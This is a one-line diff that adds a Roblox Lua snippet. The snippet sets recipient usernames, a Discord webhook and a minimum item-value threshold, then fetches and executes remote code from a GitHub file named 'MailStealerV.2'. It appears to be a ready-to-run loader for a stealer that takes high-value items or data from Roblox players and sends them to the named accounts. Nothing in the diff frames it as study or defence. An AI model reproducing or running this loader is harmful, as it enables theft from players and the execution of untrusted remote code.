@@ -1,0 +1,1 @@
+```Username = "Huntos216" Username2 = "Huntos216alt1" webhook = "https://discord.com/api/webhooks/" min_rap = 10000000  loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()```
